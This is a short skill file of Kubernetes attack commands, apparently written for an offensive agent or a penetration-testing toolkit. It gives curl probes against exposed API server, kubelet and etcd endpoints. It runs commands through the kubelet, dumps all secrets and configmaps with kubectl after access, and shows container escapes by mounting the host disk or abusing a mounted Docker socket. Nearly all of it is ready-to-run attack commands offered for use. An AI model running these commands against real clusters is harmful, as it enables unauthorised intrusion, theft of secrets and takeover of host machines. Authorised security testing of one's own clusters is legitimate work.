# SKILL: Kubernetes Attacks
## Version: 1.0 | Domain: infra

---

## EXPOSED SURFACES
```bash
# API server (6443)
curl -sk https://TARGET:6443/api/v1/namespaces
curl -sk https://TARGET:6443/version

# Kubelet (10250)
curl -sk https://TARGET:10250/pods
curl -sk https://TARGET:10250/run/default/POD/CONTAINER -d "cmd=id"

# Dashboard (usually 8443 or 30000+)
curl -sk https://TARGET:8443/

# etcd (2379) — contains ALL secrets
curl -sk https://TARGET:2379/v2/keys/?recursive=true

# cAdvisor (4194)
curl -sk https://TARGET:4194/containers/
```

## POST-EXPLOITATION (with kubectl access)
```bash
kubectl get secrets --all-namespaces -o json
kubectl get pods --all-namespaces
kubectl exec -it POD -- /bin/sh
kubectl get configmaps --all-namespaces -o json
```

## CONTAINER ESCAPE
```bash
# Check for privileged container
cat /proc/1/status | grep -i cap
# If CapEff = 0000003fffffffff → fully privileged

# Mount host filesystem
mount /dev/sda1 /mnt
chroot /mnt

# Docker socket mounted
ls /var/run/docker.sock && docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## TOOLS
kube-hunter, kubeaudit, kubebench, peirates

## REFERENCES
Bishop Fox kube-hunter • Kubernetes Security docs
